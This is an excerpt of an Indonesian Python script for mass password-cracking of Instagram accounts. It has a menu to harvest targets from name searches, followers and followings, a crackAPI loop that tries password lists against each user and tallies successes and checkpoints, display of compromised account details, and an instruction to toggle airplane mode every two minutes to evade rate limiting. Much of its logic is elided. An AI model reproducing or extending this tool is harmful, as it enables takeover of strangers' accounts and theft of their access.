...
{M}[{C}•{M}]{C}╭──────────── • INFORMASI SCRIPT • ─────────────╮
│ AUTHOR : RISKI GANTENG                            
│ BERGABUNG    : 17 AGUSTUS 1945        
│ KADALUARSA : 17 AGUSTUS 2055             
 | STATUS : MEMBER                          
│ LINK FACEBOOK AUTHOR : https://www.facebook.com/harjuna.dutanuswantara                                             │
╰────────────────────────────────────────────────╯
 
{B}[{C}1{B}]{C}. CRACK DARI PENCARIAN NAMA
{B}[{C}2{B}]{C}. CRACK DARI PENGIKUT
{B}[{C}3{B}]{C}. CRACK DARI MENGIKUTI
{B}[{C}4{B}]{C}. CRACK ULANG HASIL CRACK
{B}[{C}5{B}]{C}. LIHAT HASIL CRACK
{B}[{C}6{B}]{C}. BOT UNFOLLOW
{B}[{C}A{B}]{C}  Keluar {C}[{M}Exit{C}]{M}
 ...
 [{M}!{C}] hidupkan mode pesawat  setiap 2 menit
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [Crack][{K}{loop}/{len(internal)}{C}] {H}[OK :{len(success)}]{C}  {K}[CP :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r {H}[>]{C} {H}STATUS : {H} INSTAGRAM LIVE
  {H}[>]{C} {H}NAMA: {H}{nama}{C}
  ...
  {K}[>]{C} Postingan: {M}{postingan}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			print(f'\n [{U}+{C}] Total Result Instagram  {H}{len(g)}{C}')
